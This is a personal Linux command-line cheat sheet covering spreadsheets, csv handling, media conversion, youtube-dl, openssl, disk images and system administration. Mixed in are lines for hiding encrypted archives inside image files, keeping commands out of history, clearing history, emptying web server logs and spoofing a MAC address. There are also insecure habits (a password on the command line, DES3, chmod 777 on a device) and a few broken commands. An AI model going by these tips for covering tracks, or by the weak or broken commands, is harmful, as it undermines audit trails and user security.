#$ "5ic"                                ## go to cell A5, insert five more columns before column 5 formulas will autofix
#$ "ma (mb, mc and so on)               ## “mark” cell as a (or b, or c and so on) to copy it.
#$ "ca (cb, cc and so on)               ## copy contents previously marked with ma.
## "^t-C"                               ## Ctrl-T and C for color screen
#$ "P filename.sc"                      ## outputs to filename.sc
#$ "M filename.sc"                      ## merge current data into previously saved content
#$ "S tblstyle=0" "T filename.cln"      ## output colon-separated file to filename.cln formulas are not preserved
## "q"                                  ## quit
##------------------------------------------
## Copy sc cln output to csv, formulas are not preserved
$> cat filename.cln | sed 's/:/,/g' > filename.csv
##------------------------------------------
## Convert .sc to .csv ?WORKING?
$> ssconvert test5.sc file5.csv
##------------------------------------------
## Show formated csv
$> cat test5.csv | sed '1s/^/a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb\n/' | column -s , -tn | nl -v 0
## Convert csv and sc, Numbering starts at A0 for sc and A1 for everything else, so formulas are messed up on translation
## Show formulas
$> cat test5.csv | sed -e '1i,,,,,,,' | psc -k -d, | sc
## Evaluate formulas
$> cat test5.csv | sed -e '1i,,,,,,,' |sed -e 's/=sum/@sum/g' -e 's/=SUM/@SUM/g' | psc -k -d, | sed -e 's/\"@SUM(/@SUM(/' -e 's/)"/)/' | sed '/@SUM/ { s/rightstring/let/; }' | sed -e '/= "=/s/rightstring/let/' -e '/= "=/s/"//g' | sed 's/= =/= /g' | sc
## Make a function csv-evaluate
$> function csvev() { cat $1 | sed -e '1i,,,,,,,' |sed -e 's/=sum/@sum/g' -e 's/=SUM/@SUM/g' | psc -k -d, | sed -e 's/\"@SUM(/@SUM(/' -e 's/)"/)/' | sed '/@SUM/ { s/rightstring/let/; }' | sed -e '/= "=/s/rightstring/let/' -e '/= "=/s/"//g' | sed 's/= =/= /g' | sc ;}
##==========================================
## Work with comma seperated list spreadsheets .csv
## display a tab separated file in columns
$> cat <file>.csv | column -t
## drop first column of output by piping to this
$> cat <file>.csv | column -t | awk '{for(i=2;i<=NF;i++) printf("%s%s",$i,(i!=NF)?OFS:ORS)}'
## or
$> cat <file>.csv |awk '{ $1="";print}'
##==========================================
## Work with comma seperated list spreadsheets .csv
## View spreadsheet, display a comma separated file in columns, with row numbers and column letters, can add more letters for bigger sheets, less -S no wrap
$> cat file.csv | sed '1s/^/a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb\n/' | column -s , -tn | nl -v 0 | less -S
## csv can have formulas.
#$ name,amount1,amount2,total
#$ bank1,100,200,=SUM(B2:C2)
#$ bank2,10,20,=SUM(B3:C3)
#$ ,,,=SUM(D2:D3)
## Open in libre-calc, save with formulas showing, Save as... check filters, save with formulas
## Evaluate formulas in command line
$> function csvev () { cat $1 | sed -e '1i,,,,,,,' | sed -e 's/=sum/@sum/g' -e 's/=SUM/@SUM/g' | psc -k -d, | sed -e 's/\"@SUM(/@SUM(/' -e 's/)"/)/' | sed '/@SUM/ { s/rightstring/let/; }' | sed -e '/= "=/s/rightstring/let/' -e '/= "=/s/"//g' | sed 's/= =/= /g' | sc ;}
##------------------------------------------
## Shorter
$> function csvev () { cat $1 | sed -e '1i,,,,,,,' -e 's/=sum/@sum/g' -e 's/=SUM/@SUM/g' | psc -k -d, | sed -e 's/\"@SUM(/@SUM(/' -e 's/)"/)/' -e '/@SUM/ { s/rightstring/let/; }' -e '/= "=/s/rightstring/let/' -e '/= "=/s/"//g' -e 's/= =/= /g' | sc ;}
##==========================================
## Play White noise from urandom
$> aplay -c 2 -f S16_LE -r 44100 /dev/urandom
##==========================================
## List files newest first
$> ls -lt --time=atime
##==========================================
## Find and replace specific characters in a single line in multiple files with sed
$> for f in `ls`; do sed -i '/MATCHING STRING/ { s/ORIGINAL/REPLACEMENT/; }' ${f} ; done
##==========================================
## Create an animation we use the ffmpeg convert command
$> convert -delay 50 frame1.gif frame2.gif frame3.gif -loop 0 animated.gif
## Create an animated gif of 3 frames with 50 ms delay between them looping indefinitely.
## Vary delay between the images, specify the delay before each separate frame
$> convert -delay 50 frame1.gif -delay 100 frame2.gif -delay 150 frame3.gif -loop 0 animated.gif
## Add a pause between each loop
$> convert -delay 50 frame1.gif -delay 100 frame2.gif -delay 150 frame3.gif -loop 0 -pause 200 animated.gif
## Convert we can combine 2 animated gifs
$> convert anim1.gif anim2.gif combined.gif
##==========================================
## To encrypt a file with openssl
## Works on OS X, Linux, anywhere with OpenSSL installed:
$> openssl enc -des3 -salt -in infile.txt -out encryptedfile
## To decrypt the file:
$> openssl enc -des3 -d -salt -in encryptedfile -out normalfile.txt
##------------------------------------------
## Hide archive in image file.
$> cat archive.zip >> image.gif
#Rename add .zip to end of file.
$> mv image.gif image.gif.zip
## Open in archive peogram.
##------------------------------------------
## Hide a rar archive inside a png image file and then retrieve the files from this image.
$> cat picture.png archive.rar > hidden_archive_in_pic.png
## Rename add .rar to end of file. Open in archive peogram.
##------------------------------------------
## Make a encrypted file inside a gif image
$> tar -zcvf stuff.tgz ./stuff
## Openssl will ask for password
$> openssl enc -des3 -salt -in stuff.tgz -out encryptedstuff
$> zip encryptedstuff.zip encryptedstuff
## Pick a .gif from the web to hide your encrypted directory in.
$> cat encryptedstuff.zip >> pic.gif
## Take it back out again
$> mv pic.gif encryptedstuff.zip
$> uzip encryptedstuff.zip
$> openssl enc -d -des3 -salt -out stuff.tgz -in encryptedstuff
$> tar -zxvf stuff.tgz
##------------------------------------------
## Functions to encrypt and decrypt
## Function to make encrypted file hidden in a .gif; Usage: crypt Directory_To_Encrypt image.gif
$> function cryptgif() { cp "$2" pic.gif && tar -zcvf stuff.tgz ./"$1" && openssl des3 -salt -in stuff.tgz -out encryptedstuff && zip encryptedstuff.zip encryptedstuff && cat encryptedstuff.zip >> pic.gif && cp pic.gif crypt.gif && rm  pic.gif && rm stuff.tgz && rm encryptedstuff && rm encryptedstuff.zip ; }
##------------------------------------------
## Function to de-encrypt an encrypted file hidden in a .gif
$> function decryptgif() { cp $1 encryptedstuff.zip && unzip encryptedstuff.zip ; openssl enc -d -des3 -salt -out stuff.tgz -in encryptedstuff && tar -zxvf stuff.tgz && rm encryptedstuff.zip && rm encryptedstuff && rm stuff.tgz ; }
##==========================================
## Extract public key from private
## This will extract the public key that is stored in the private key using openssl
$> openssl rsa -in key.priv -pubout > key.pub
##==========================================
## find directories on your machine that are taking up greater than 1G
$> du -h -d 1 | ack '\d+\.?\d+G' | sort -hr
##==========================================
## Check gmail without showing password in script
$> curl -u youremail@gmail.com --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if //; print "$2\n" if /<(title|name)>(.*)<\/\1>/;'
##------------------------------------------
## ???Check your unread Gmail from the command line, security alert run command with leading space to avoid password being added to .bash_history
$> curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
##------------------------------------------
## Email from commandline; NOT WORKING IN GMAIL ANY MORE
## $> echo "Hope this works" | mail -s "Working?" mail@gmail.com
##------------------------------------------
## Mail contents of apple.txt as a message to nobody@december.com, subject line "subject,"
$> mail -s "subject" nobody@december.com < apple.txt
## message "City Hall 1pm" to nobody@december.com with the subject line "meeting today"
$> echo "City Hall 1pm" | mail -s "meeting today" nobody@december.com
##==========================================
## Grep through files in the dirctory -R recursive, .
$> grep -RnsI --color=auto "seach term"
##==========================================
## Place a filename at the beginning of the line and input redirect with < to make it easier to edit the search at the end of the command.
$> </var/log/syslog grep foo
$> </var/log/syslog grep bar
##==========================================
## Make your own locate type search using find and grep.
## Make the database, takes a while.
$> sudo find / > ~/.database
## then search using grep
$> cat .database | grep 'term'
## or
$> grep 'term' .database
##==========================================
## multiple command output into a single program:
$> diff -u <(ls -c1 dir_1) <(ls -c1 dir_2)
## Will show you a diff of files in the root of dir_1 and dir_2
##==========================================
## Display line numbers a text file like $> cat -n text.txt
$> nl text.txt
##==========================================
## Get big .bash_history file. Put in .bashrc for permanent
$> export HISTFILESIZE='10000'
$> export HISTSIZE='5000'
##==========================================
## Mount VDI file (VirtualBox Disk Image) partition
$> sudo mount -t auto -o ro,loop,uid=user,gid=group,umask=0777,fmask=0777,offset=0x$(hd -n 1000000  /home/$USER/.VirtualBox/HardDisks/XP.vdi | grep "eb 52 90 4e 54 46 53" | cut -c 1-8) /home/$USER/.VirtualBox/HardDisks/XP.vdi /media/vdi
##==========================================
## Change the extension of these files from .txt to .md
$> mmv "*.txt" "#1.md"
##==========================================
## Share the current tree over the web
$> python -c "import SimpleHTTPServer;SimpleHTTPServer.test()"
## Want to show something on your machine to someone over the web? do not copy it or upload it somewhere. Just run "webshare" and the current directory and everything beneath it will be served from a new web server listening on port 8000. When your pal is finished, hit control-c.
## Found at www.shell-fu.org/lister.php?id=54
##==========================================
## download a torrent
$> btdownloadheadless --display_interval 5 --spew 1 torrentfile.torrent
##==========================================
## Output a video in ASCII format
$> mplayer -vo caca 'video_filename.ext'
##==========================================
## Play video in freamebuffer in tty login without GUI
$> sudo chmod 777 /dev/fb0
$> mplayer -vo fbdev2 -fs FILENAME.avi
## Set video size to screen size
$> mplayer -vo fbdev2 -fs -zoom -x 1024 -y 768 FILENAME.mp4
##==========================================
## Screencasting with mplayer webcam window:
$> sudo apt-get install mplayer
$> mplayer -cache 128 -tv driver=v4l2:width=176:height=177 -vo xv tv:// -noborder -geometry "95%:93%" -ontop | ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le output.wav -an -vcodec libx264 -vpre lossless_ultrafast -threads 0 output.mp4
##==========================================
## Create a script of the last executed command
$> cat > script.sh
## #! /bin/bash
## cnt+d to commit
$> echo "!!" >> script.sh
$> chmod 755 script.sh
##==========================================
## Searches for searchterm in manuals
$> man options -k or -f searchterm
##==========================================
## /etc/cron.daily
##==========================================
$> find /home -name "*.iso"  ## Finds all iso in home dir
##==========================================
$> file *                    ## Shows file types of listed files
##==========================================
$> mkdir -p /path/to/dir     ## make whole dir path
##==========================================
$> grep-i                    ## case insensitive,
$> fgrep                     ## searches through multiple files
##==========================================
$> ps a                      ## all TTY
$> ps -u $USER               ## processes started by $USER
$> ps aux                    ## show all processes for all users
$> ps -C processesname       ## processes of name
$> pstree                    ## make tree of processes
$> top                       ## shows processes
##==========================================
## Random number between 1 and 100.
$> shuf -i 1-100 -n 1
##==========================================
## To find and replace a string of text in a file:
$> sed -i ’s/orginal text/new text/g’ filename.txt
## or
$> <filename.txt sed -i ’s/orginal text/new text/g’
## or favorite but uses two commands
$> cat filename.txt | sed -i ’s/orginal text/new text/g’
##------------------------------------------
## appends to top of file
$> cat file.txt | sed '1s/^/YOURTEXT\n/'
## write it to file
$> sed -i '1s/^/YOURTEXT\n/' file.txt
## append to bottom of file
$> echo 'YOURTEXT' >> file.txt
##==========================================
## Create Animated GIF in Linux from Command Line
$> sudo apt-get install imagemagick
## If needed, date/name files in a numbered or sequential order. The manor in which they appear listed in your directory is the order they will appear in the animated GIF!
## Next, resize your .jpg images to a smaller size, such as 640×480 by using the following command:
$> mogrify -resize 640x480 *.jpg
## And finally, issue the command below to create an animated gif of your jpg images.ease the delay time for a longer transition between images. Tack loop 0 will loop your GIF indefinitely. Tack loop 3 would loop three times, for example.
$> convert -delay 20 -loop 0 *.jpg myimage.gif
##==========================================
## Add files to iso image.
$> mount -o loop /tmp/linux-install.iso /media/iso
$> cp /media/iso/* /mnt/test
## Add and change any file you need to. Then make CD.
$> mkisofs -o ../your-new.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V “Your Disk Name Here” .
##==========================================
## Will show you a diff of files in the root of dir_1 and dir_2
$> diff -u <(ls -c1 dir_1) <(ls -c1 dir_2)
##==========================================
## pull out the MP3 from an FLV
$> mplayer -dumpaudio "xyz-5.flv" -dumpfile "decent_filename.mp3"
##==========================================
## Alphabetize and remove one of any duplicates in a list
$> sort test.txt | uniq  > test_sort-uniq.txt
##==========================================
## From a PNG of text OCR to editable text.
$> gocr -i ImageOfText.png > EditableText.txt
##==========================================
## Look up attached scanners.
$> scanimage -L
##==========================================
## Screenshot
$> import -window root -delay 40 ~/Pictures/screenshot`date +"%Y%m%d-%H:%M.%S"`.png
## Can make a launcher to run it.
##==========================================
## Find stuff
## General form
$> find START_DIRECTORY -name SEARCH_TERM -print
## ex. Find all txt files in everyone's home directory, write to a file, and display in less.
$> find /home --name "*.txt" -print > find.list ; cat find.list | less
##==========================================
## Check your current swappiness setting on a scale of 0-100:
$> cat /proc/sys/vm/swappiness
## The result will probably be 60.
##==========================================
## Convert to Kindle .mobi, because amazon can't read epub like everything else does.
$> ebook-convert "ebook.epub" "ebook.mobi"
##==========================================
## Execute a command without saving it in the history
## Prepending one or more spaces to your command won't be saved in history
## Useful for pr0n or passwords on the commandline.
$> <space>command
##==========================================
## Send notification to username at display.
## First ssh into computer you are trying to reach
$> ssh USER@192.168.1.11
## Find username and display.
$> who
## Display or speak message on the recipents computer.
$> DISPLAY=:0 sudo -u username notify-send 'Subject.' 'This is my message.'
$> DISPLAY=:0 sudo -u username espeak 'This is my message.'
##==========================================
## Color ascii video from webcam;
$> mplayer -tv driver=v4l2:gain=1:width=640:height=480:device=/dev/video0:fps=10:outfmt=rgb16 -vo caca tv://
##==========================================
## https://rg3.github.io/youtube-dl/
## youtube-dl
## Download video files from a bunch of sites (here is a list https://rg3.github.io/youtube-dl/supportedsites.html).
## The options say: base filename on title, ignores errors and continue partial downloads. Also, stores some metadata into a .json file plz.
## Paste youtube users and playlists for extra fun.
$> youtube-dl -tci --write-info-json "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
## youtube-dl Download and play videos from youtube in linux;
$> sudo youtube-dl -U #update latest youtube api changes.
$> youtube-dl --get-filename -o "%(title)s.%(ext)s" RICeErc0ni8
## Patsy Cline - Walkin' After Midnight.mp4
$> youtube-dl -o "%(title)s.%(ext)s" RICeErc0ni8
## cclive Youtube downloader, play audio from youtube, --exec '<command>' executes a command mplayer after downloading video,
##             %f  .. Full path to the downloaded media file
##             %n  .. Name of the downloaded media file
##             %t  .. Unfiltered media title
$> cclive http://www.youtube.com/watch?v=mbnYFz5DO1U --exec 'mplayer -vo null "%n"'
$> mplayer "test.mp4"
$> mplayer -vo null "test.mp4"                                 ## audio only
$> mplayer -vo caca "test.mp4"                                 ## ascii video
$> mplayer -vo fbdev2 -fs -zoom -x 1024 -y 768 "test.mp4"      ## full video in frambuffer (adjust zoom to screen size)
##-------------------------------------
## Streams youtube-dl video to mplayer.
#$> syt 'youtube.com/link' 'anotherlinkto.video'
$> syt() { pipe=`mktemp -u`; mkfifo -m 600 "$pipe" && for i in "$@"; do youtube-dl -qo "$pipe" "$i" & mplayer "$pipe" || break; done; rm -f "$pipe"; }
##-------------------------------------
## Streams cclive youtube video to mplayer.
#$> ytmp() { pipe=`mktemp -u`; mkfifo -m 600 "$pipe" && for i in "$@"; do cclive "$pipe" "$i" & mplayer "$pipe" || break; done; rm -f "$pipe"; }
##-------------------------------------
## youtube-dl play in text mode
$> youtube-dl -x RICeErc0ni8 | mplayer -vo caca
##-------------------------------------
## Get playlist for Livestream on YouTube
$> youtube-dl --list-formats <URL>; youtube-dl -f <STREAM_ID> -g <URL>
##-------------------------------------
## Get playlist for Livestream on YouTube
$> youtube-dl -f 43 -i [URL OF MAIN CHANNEL WITH ALL VIDEOS]
##-------------------------------------
## Download just the thumbnails of a list of videos from youtube
$> youtube-dl -a urls.txt --write-thumbnail --skip-download
##-------------------------------------
## Download a list urls of videos from youtube
$> youtube-dl -a urls.txt
##==========================================
## multiple command output into a single program:
$> diff -u <(ls -c1 dir_1) <(ls -c1 dir_2)
## Will show you a diff of files in the root of dir_1 and dir_2
##==========================================
## Listen on localhost:80, forward to localhost:81 and log both sides of the conversation to outflow, automatically restarting if the connection dies.
$> mknod backpipe p; while nc -l -p 80 0<backpipe | tee -a inflow | nc localhost 81 | tee -a outflow 1>backpipe; do echo \"restarting\"; done
##==========================================
## If you already have your scanner working on your own system, you may come across times where you want to scan something from another computer on your network. Rather than fiddling around with USB cables, you can share the scanner over the network and use your scanner from any computer.
##    This guide assumes the scanner is working and plugged into an Ubuntu system.
$> sudo apt-get install sane-utils
##    Open a terminal and run the following command to open the configuration file in a text editor:
$> sudo gedit /etc/default/saned
##    Change "RUN=no" to "RUN=yes"
$> sudo gedit /etc/sane.d/saned.conf
##    Find the section that looks like this:
##    ## Access list# A list of host names, IP addresses or IP subnets (CIDR notation) that # are permitted to use local SANE devices. IPv6 addresses must be enclosed
##    # in brackets, and should always be specified in their compressed form.
##    # The hostname matching is not case-sensitive.
##    #scan-client.somedomain.firm
##    #192.168.0.1
##    192.168.1.0/24
##    #[2001:7a8:185e::42:12]
##    #[2001:7a8:185e::42:12]/64
##    Add your own internal IP address in place of the section in bold. do not forget the /24.
##    Save and close the file
##    Add the "saned" user to the "lp" group so it can use the scanner:
$> sudo adduser saned lp
##    Restart the sane daemon:
##    sudo service saned restartYou should now be able to access the scanner over the network.
##==========================================
## Convert mkv to mp4 without reencoding
$> ffmpeg -i in.mkv -vcodec copy -acodec copy out.mp4
##------------------------------------------
## Convert mkv to mp4 without reencoding
$> avconv -i  *.mkv -c:v copy -c:a copy ouput.mp4
##==========================================
## Convert avi to mp4 with HandBrakeCLI
$> HandBrakeCLI -i "{}".avi -o "{}".mp4
##==========================================
## Convert matroska mkv video files to mp4 by changing container without reencoding.
$> function mkv2mp4() { ffmpeg -i "$1" -vcodec copy -acodec copy "$1".mp4 ; }
##==========================================
## Convert matroska mkv video files to mp4 by changing container without reencoding.
$> avconv -i  *.mkv -c:v copy -c:a copy ouput.mp4
##==========================================
## Convert video files to mp4 by changing container without reencoding. Useage: 2mp4 *.mkv
$> function 2mp4() { avconv -i  "$1" -c:v copy -c:a copy "$1".mp4 ; }
##==========================================
## Transcode both video and audio of video files to mp4 by changing container and reencoding. Long process. Useage: 2mp4 *.avi
$> function trans2mp4() { avconv -i  "$1" -c:v libx264 -c:a mp3 "$1".mp4 ; }
##=========================================
## Temporarily restart an init script
$> sudo /etc/init.d/SCRIPT_NAME restart
## Temporarily stop an init script
$> sudo /etc/init.d/SCRIPT_NAME stop
##==========================================
## Display all '.txt' file
$> find . -name '*.txt'
##==========================================
## motto of Ailurus
## Give a man a fish and he can eat for a day; but if you teach him how to fish, he'll eat for a lifetime.
## Information
$> lsb_release -is                                            ## Display Linux distributors ID
$> lsb_release -rs                                            ## Display Linux release number
$> lsb_release -cs                                            ## Display Linux code name
$> uname -m                                                   ## Display machine hardware name
$> lspci                                                      ## List all PCI devices, such as display card and ethernet card
$> lsmod                                                      ## Display a list of modules in the Linux Kernel
$> lsusb -v                                                   ## List USB devices
$> sudo ethtool eth0                                          ## Display the status of ethernet card
$> sudo lshw                                                  ## List hardware
$> sudo fdisk -l                                              ## List harddisk partitions
$> sudo hdparm -I /dev/sda                                    ## Display SATA harddisk parameters
$> df -h                                                      ## Display disk space usage
$> du -bsh FOLDER_NAME                                        ## Display file/folder space usage
$> free                                                       ## Display amount of free and used memory
$> ps -e                                                      ## Display processes
$> pstree                                                     ## Display a tree of processes
$> top                                                        ## Display processes dynamically
$> cal                                                        ## Displays a calendar
$> lsof -p PROCESS_ID                                         ## List files which are opened by a given process
$> lsof -c PROCESS_NAME                                       ## List files which are opened by a given process
$> lsof FILE_NAME                                             ## List processes which opened a given file
## Use
$> less FILE_NAME                                             ## Read a long file
$> grep REG_EXP FILE_NAME                                     ## Print lines matching a pattern
$> grep -lr REG_EXP PATHNAME                                  ## Display a list of file name. The files contain a given string.
$> find . -name '*.txt'                                       ## Display all '.txt' file
$> touch file_name_1 file_name_2                              ## Create two empty files
$> mkdir -p /tmp/a/b/c/d/e                                    ## Create directory. Create parent directories as needed.
$> cd                                                         ## Change working directory to the home folder
$> cd -                                                       ## Change working directory to the previous working directory
$> ls -a                                                      ## Display hidden files
$> cp -a SOURCE_DIRECTORY DEST_DIRECTORY                      ## Copy directory. Preserve links, file mode, ownership, timestamps
$> file FILE_NAME                                             ## Determine file type
$> tail -n 6 FILE_NAME                                        ## Output the last 6 lines
$> scp -rp FILE_NAME USERNAME@HOST:DEST_PATH                  ## Copy files via SSH
$> rename 's/.rm$/.rmvb/' *                                   ## Rename '*.rm' files to '*.rmvb' files
$> rename 'tr/A-Z/a-z/' *                                     ## Change the file name to lowercase
$> ls -d */.                                                  ## Display subdirectories in current directory
$> ls . | wc -w                                               ## Display the number of files in current directory
$> gunzip FILE_NAME.gz                                        ## Extract "*.gz" file
$> tar zxf FILE_NAME.tar.gz                                   ## Extract "*.tar.gz" file
$> tar jxf FILE_NAME.tar.bz2                                  ## Extract "*.tar.bz2" file
$> tar czf FILE_NAME.tar.gz FILE1 FILE2 FILE3                 ## Do compression
$> tar cjf FILE_NAME.tar.bz2 FILE1 FILE2 FILE3
$> sudo ntpdate ntp.ubuntu.com                                ## Set the date and time via NTP
$> watch -d free                                              ## Continuously monitor the memory usage
$> w3m -dump_head http://example.com                          ## Display HTTP HEAD response
$> nl FILE_NAME                                               ## Display file content with line number
$> sudo rkhunter --checkall                                   ## Eliminate Rootkit
$> du -bsh $HOME                                              ## Total size of home folder
$> find $HOME/.thumbnails/ -type f -atime +7 -exec rm {} \;   ## $HOME/.thumbnails/ directory is a cache dir containing thumbnail pictures of picture files you've previously looked at.. You can delete the files in the .thumbnails directory that have not been accessed for seven days, to free disk space.
$> gnome-screenshot -d 10                                     ## Capture screen after 10 seconds
$> gnome-screenshot -wd 10                                    ## Capture current window after 10 seconds
$> convmv -r -f gbk -t utf8 --notest FILE_NAME                ## Convert the file name from GBK to UTF8
$> iconv -f gbk -t utf8 FILE_NAME                             ## Convert the file content from GBK to UTF8
$> find . -name '*.mp3' -execdir mid3iconv -e GBK {} \;       ## Convert tags in '*.mp3' from GBK to UTF8
##Networking
$> sudo hostname new_name                                     ## Change hostname
$> sudo pppoeconf                                             ## Configure an ADSL connection
$> sudo pon                                                   ## Starts up ADSL connections
$> sudo poff                                                  ## Shuts down ADSL connections
$> arping IP_ADDRESS                                          ## Display MAC of a given IP address
$> nmblookup -A IP_ADDRESS                                    ## Display NetBIOS name of a given IP address
$> ifconfig -a                                                ## Display IP address and MAC
$> netstat -rn                                                ## Display route
$> sudo ifconfig eth0 hw ether 00:11:22:33:44:55              ## Set MAC of ethernet interface
$> whois example.com                                          ## Display information of a domain name
$> tracepath example.com                                      ## Display the network path to a given host
$> sudo dhclient                                              ## Request an IP address from DHCP server
$> lsof -i :80                                                ## List processes which are using port 80
## Maintainance
$> echo 3 > /proc/sys/vm/drop_caches                          ## Reclaim memory which stores pagecache, dentries and inodes
$> sudo kill -9 PROCESS_ID                                    ## Terminate a process with a given process id
$> sudo killall PROCESS_NAME                                  ## Terminate all processes with a given name
$> sudo /etc/init.d/SCRIPT_NAME restart                       ## Temporarily restart an init script
$> sudo /etc/init.d/SCRIPT_NAME stop                          ## Temporarily stop an init script
$> sudo adduser USER_NAME                                     ## Add a user
$> sudo deluser USER_NAME                                     ## Delete a user
$> sudo passwd USER_NAME                                      ## Change user password
$> sudo chfn USER_NAME                                        ## Changes user fullname, office number, office extension, and home phone number information.
$> finger USER_NAME                                           ## Display user information
$> sudo usermod -L USER_NAME                                  ## Temporarily prevent a user from logging in
$> sudo usermod -U USER_NAME                                  ## Revoke the operation above
$> sudo usermod -G admin -a USER_NAME                         ## Add a user to admin group
$> export http_proxy=http://PROXY.DOMAIN.NAME:PORT            ## Set the HTTP proxy
$> im-switch -c                                               ## Choose the input method for X Window
$> sudo halt                                                  ## Poweroff your os but does not power down
$> sudo shutdown -h now
$> sudo reboot                                                ## Reboot your computer
$> sudo shutdown -r now
##==========================================
## Change Process priority
## renice NEW_PRIORITY `pgrep NAME_OF_PROCESS`
$> renice 5  `pgrep firefox`
##         renice -5 `pgrep wine-server'
##               high <------------------> low
## NEW_PRIORITY = -19, -18, -17 [...] 18, 19, 20
##==========================================
## Clear Bash history
$> history -c
##==========================================
## Listen on localhost:80, forward to localhost:81 and log both sides of the conversation to outflow, automatically restarting if the connection dies.
$> mknod backpipe p; while nc -l -p 80 0<backpipe | tee -a inflow | nc localhost 81 | tee -a outflow 1>backpipe; do echo \"restarting\"; done
##==========================================
## Pointing to a file shows what's interacting with that file
$> lsof /var/log/syslog
## or
$> lsof /var/log/messages
##==========================================
## Show what a given user has open using -u
$> lsof -u daniel
## You can also use the -t with -u to kill everything a user has open
$> kill -9 `lsof -t -u daniel`
##==========================================
## Can remove stuff i do not need and take things from loading up on startup.
## ie. if you do not have bluetooth, are not blind and need brail, find other stuff you do not need.
$> sudo apt-get remove bluetooth brltty
## etc and add stuff that may not be there which are useful for customisation.
## and customise away. e.g. i take out stuff like gwibber and telepathy and put in emesene, thunderbird, firefox, transmission etc sysv-rc-conf and take out ppd-dns and stuff used for dial-up, and sudo apt-get remove modemmanager while you're at it - it loads at startup and most have no need for it.
##==========================================
## binary clock
$> perl -e 'for(;;sleep 1){printf"\r"."%.4b "x6,split"",`date +%H%M%S`}'
##==========================================
## Compare a remote file with a local file
$> test "$(md5sum /local/file | cut -d' ' -f1)" == "$(ssh root@xen -- md5sum /remote/file | cut -d' ' -f1)" && echo "Match" || echo "Differ"
##==========================================
## Streams youtube-dl video to mplayer.
## syt 'youtube.com/link' 'anotherlinkto.video'
$> syt() { pipe=`mktemp -u`; mkfifo -m 600 "$pipe" && for i in "$@"; do youtube-dl -qo "$pipe" "$i" & mplayer "$pipe" || break; done; rm -f "$pipe"; }
##==========================================
## Create mp3 from wav
$> lame -V3 input.wav output.mp3
##==========================================
## Convert an mp3 and add to it a img
$> lame -v 2 -b 192 --ti /path/to/file.jpg audio.mp3 new-audio.mp3
##==========================================
## Rename file to same name plus datestamp of last modification.
$> FILENAME=nohup.out
$> mv -iv $FILENAME{,.$(stat -c %Z $FILENAME)}
##==========================================
## slow down/speed up video file
$> mencoder -speed 2 -o output.avi -ovc lavc -oac mp3lame input.avi
##==========================================
## In case you need to test some CGI scripts this does the job. It also has the functionality of a http server.
$> python2 -m CGIHTTPServer
##==========================================
## rename all images in folder with prefix of date and time from exif data
$> for i in `ls` ; do date=$(identify -format %[exif:DateTime] $i); date=${date//:/-}; date=${date// /_}; mv $i ${date}__$i; done
##==========================================
## convert png images to jpg and optimize them
$> ls *.png | cut -d . -f 1 | xargs -L1 -i convert -strip -interlace Plane -quality 80 {}.png {}.jpg
##==========================================
## Convert pdf to jpg
$> convert -density 300 -quality 100 mozilla.pdf page_%04d.jpg
##------------------------------------------
## Make jpg into pdf
## Number jpgs in page order.  img2pdf keeps quality
$> img2pdf *.jpg -o out.pdf
##------------------------------------------
## Convert jpg to pdf, low quality Better to use img2pdf.. convert decreases quality of jpgs,
$> convert *.jpg output.pdf
$> convert page1.jpg page2.jpg +compress file.pdf
$> convert -rotate 90 page\*.jpg +compress file.pdf
##------------------------------------------
##==========================================
## Change caps lock to backspace (Works on Ubuntu 14.04)
$> setxkbmap -option caps:backspace
##==========================================
## Speak out fortunes
$> fortune | espeak -s 135
##==========================================
## Null a file with sudo
$> sudo bash -c "> /var/log/httpd/access_log"
##==========================================
## Mount a VMware virtual disk (.vmdk) file on a Linux box
## This does not require you to know the partition offset, kpartx will find all partitions in the image and create loopback devices for them automatically. This works for all types of images (dd of hard drives, img, etc) not just vmkd. You can also activate LVM volumes in the image by running
$> vgchange -a y
## and then you can mount the LV inside the image.
## To unmount the image, umount the partition/LV, deactivate the VG for the image
$> vgchange -a n <volume_group>
## then run
$> kpartx -dv <image-flad.vmdk>
## to remove the partition mappings.
$> kpartx -av <image-flat.vmdk>; mount -o /dev/mapper/loop0p1 /mnt/vmdk
##==========================================
## Mount a VirtualBox VDI image
$> sudo apt-get install qemu-kvm
## Load the nbd kernel module. network block device module
$> modprobe nbd
$> qemu-nbd -c /dev/nbd0 <vdi-file>
## That command will expose the entire image as a block device named /dev/nbd0, and the partitions within it as subdevices. For example, the first partition in the image will appear as /dev/nbd0p1.
## Now you could, for instance, run cfdisk on the block device, but you will most likely want to mount an individual partition.
##  “max_part” parameter for nbd kernel module can be set to 0, for this to work, one has to do “modprobe nbd max_part=16”
$> mount /dev/nbd0p1 /mnt
##------------------------------------------
## When you are done, unmount the filesystem and shut down the qemu-nbd service.
$> umount /mnt
$> qemu-nbd -d /dev/nbd0##
##==========================================
## make image semi-transparent
$> convert input.png -alpha set -channel A -fx 0.5 output.png
##==========================================
## Sync the existing directory structure to destination, without transferring any files
$> rsync -av -f"+ */" -f"- *" [source] [dest]
##==========================================
## Display disks by id, UUID and HW path
$> sudo blkid
##==========================================
## Convert mp4 to mp3 in a directory
## Good for when you download youtube videos and want the mp3 for your mp3 player.
$> for a in $(find . -maxdepth 1 -name "*.mp4" -type f -printf "%f\n" | rev | cut -d '.' -f2- | rev | sort -u); do if [ ! -f "$a.mp3" ]; then  avconv -i "$a."* -vn  -ab 128 "$a.mp3"; fi done
##==========================================
## Install ffmpeg
#$> sudo apt-add-repository ppa:samrog131/ppa
#$> sudo apt-get update
#$> sudo apt-get install ffmpeg-real
## Next, to make FFmpeg 2.6.0 work, create the below symlink:
#$> sudo ln -sf /opt/ffmpeg/bin/ffmpeg /usr/bin/ffmpeg
##
## ???Capture Audio/video???
